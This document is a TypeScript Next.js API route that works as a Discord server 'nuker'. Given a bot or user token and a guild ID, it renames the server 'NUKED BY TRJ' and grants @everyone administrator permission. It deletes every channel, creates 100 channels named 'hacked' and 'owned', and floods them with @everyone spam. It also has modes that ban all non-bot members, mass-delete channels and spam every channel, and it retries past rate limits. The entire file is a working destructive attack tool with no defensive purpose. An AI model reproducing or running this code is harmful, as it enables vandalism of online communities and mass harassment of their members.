import { NextRequest, NextResponse } from 'next/server'

export async function POST(req: NextRequest) {
  try {
    const { token, guildId, action, spamMessage, serverName } = await req.json()
    
    if (!token || !guildId || !action) {
      return NextResponse.json({ error: 'بيانات ناقصة' }, { status: 400 })
    }

    const stats = { deleted: 0, created: 0, spam_sent: 0, banned: 0 }
    
    const sleep = (ms: number) => new Promise(r => setTimeout(r, ms))
    
    const api = async (method: string, endpoint: string, body?: object): Promise<any> => {
      try {
        const res = await fetch(`https://discord.com/api/v10/${endpoint}`, {
          method,
          headers: { 
            'Authorization': token, 
            'Content-Type': 'application/json' 
          },
          body: body ? JSON.stringify(body) : undefined
        })
        
        if (res.status === 429) {
          const data = await res.json().catch(() => ({}))
          await sleep(((data as any).retry_after || 1) * 1000 + 500)
          return api(method, endpoint, body)
        }
        
        if (res.status === 204) return { success: true }
        if (res.status === 201 || res.status === 200) {
          return res.json().catch(() => ({ success: true }))
        }
        
        return res.json().catch(() => ({ _status: res.status }))
      } catch {
        return { error: true }
      }
    }
    
    // Parallel batch requests
    const apiBatch = async (requests: Array<{method: string, endpoint: string, body?: object}>) => {
      const results = []
      const batchSize = 10
      
      for (let i = 0; i < requests.length; i += batchSize) {
        const batch = requests.slice(i, i + batchSize)
        const batchResults = await Promise.all(
          batch.map(req => api(req.method, req.endpoint, req.body))
        )
        results.push(...batchResults)
        await sleep(100)
      }
      
      return results
    }

    // ═══════════════════════════════════════════════════════════════
    // 💥 NUKE - FULL SERVER NUKE
    // ═══════════════════════════════════════════════════════════════
    
    if (action === 'nuke') {
      // Change server name
      await api('PATCH', `guilds/${guildId}`, { name: serverName || 'NUKED BY TRJ' })
      
      // Get and modify @everyone role
      const roles = await api('GET', `guilds/${guildId}/roles`)
      if (Array.isArray(roles)) {
        const everyone = roles.find((r: any) => r.name === '@everyone')
        if (everyone && everyone.id) {
          await api('PATCH', `guilds/${guildId}/roles/${everyone.id}`, { 
            permissions: '8',
            mentionable: true 
          })
        }
      }
      
      // Delete all channels
      const channels = await api('GET', `guilds/${guildId}/channels`)
      if (Array.isArray(channels) && channels.length > 0) {
        const deleteRequests = channels
          .filter((c: any) => c && c.id)
          .map((c: any) => ({ method: 'DELETE', endpoint: `channels/${c.id}` }))
        
        const results = await apiBatch(deleteRequests)
        stats.deleted = results.filter((r: any) => r.success || r._status === 204 || !r.error).length
      }
      
      // Create 100 new channels
      const names = ['nuked', 'trj', 'trojan', 'ez', 'wasted', 'owned', 'hacked']
      const createRequests = []
      
      for (let i = 0; i < 100; i++) {
        createRequests.push({
          method: 'POST',
          endpoint: `guilds/${guildId}/channels`,
          body: { 
            name: `${names[i % names.length]}-${Date.now().toString(36).slice(-4)}-${i}`, 
            type: 0 
          }
        })
      }
      
      const createdChannels: any[] = []
      const createResults = await apiBatch(createRequests)
      
      createResults.forEach((res: any) => {
        if (res && res.id) {
          createdChannels.push(res)
          stats.created++
        }
      })
      
      // Spam all channels
      const msg = spamMessage || '@everyone TROJAN WAS HERE'
      const spamRequests = []
      
      for (const ch of createdChannels) {
        if (ch && ch.id) {
          for (let j = 0; j < 10; j++) {
            spamRequests.push({
              method: 'POST',
              endpoint: `channels/${ch.id}/messages`,
              body: { content: msg }
            })
          }
        }
      }
      
      const spamResults = await apiBatch(spamRequests)
      stats.spam_sent = spamResults.filter((r: any) => r && r.id).length
    }
    
    // ═══════════════════════════════════════════════════════════════
    // 🔨 BAN ALL
    // ═══════════════════════════════════════════════════════════════
    
    else if (action === 'banall') {
      let after = ''
      let keepGoing = true
      
      while (keepGoing) {
        const members = await api('GET', `guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`)
        
        if (!Array.isArray(members) || members.length === 0) {
          keepGoing = false
          break
        }
        
        const toBan = members.filter((m: any) => m && m.user && !m.user.bot && m.user.id)
        
        for (const m of toBan) {
          const result = await api('PUT', `guilds/${guildId}/bans/${m.user.id}`, { 
            delete_message_days: 7 
          })
          if (result && (result.success || !result.error)) {
            stats.banned++
          }
          await sleep(100)
        }
        
        if (members.length < 1000) {
          keepGoing = false
        } else {
          after = members[members.length - 1].user.id
        }
      }
    }
    
    // ═══════════════════════════════════════════════════════════════
    // 🗑️ DELETE ALL CHANNELS
    // ═══════════════════════════════════════════════════════════════
    
    else if (action === 'delete_channels') {
      const channels = await api('GET', `guilds/${guildId}/channels`)
      
      if (Array.isArray(channels) && channels.length > 0) {
        const deleteRequests = channels
          .filter((c: any) => c && c.id)
          .map((c: any) => ({ method: 'DELETE', endpoint: `channels/${c.id}` }))
        
        const results = await apiBatch(deleteRequests)
        stats.deleted = results.filter((r: any) => r.success || r._status === 204 || !r.error).length
      }
    }
    
    // ═══════════════════════════════════════════════════════════════
    // 📧 SPAM ALL CHANNELS
    // ═══════════════════════════════════════════════════════════════
    
    else if (action === 'spam') {
      const channels = await api('GET', `guilds/${guildId}/channels`)
      const msg = spamMessage || '@everyone TROJAN WAS HERE'
      
      if (Array.isArray(channels)) {
        const textChannels = channels.filter((c: any) => c && c.type === 0 && c.id)
        const spamRequests = []
        
        for (const c of textChannels) {
          for (let i = 0; i < 20; i++) {
            spamRequests.push({
              method: 'POST',
              endpoint: `channels/${c.id}/messages`,
              body: { content: msg }
            })
          }
        }
        
        const results = await apiBatch(spamRequests)
        stats.spam_sent = results.filter((r: any) => r && r.id).length
      }
    }

    return NextResponse.json({ success: true, stats })
  } catch (error: any) {
    return NextResponse.json({ error: 'خطأ: ' + (error.message || 'Unknown') }, { status: 500 })
  }
}
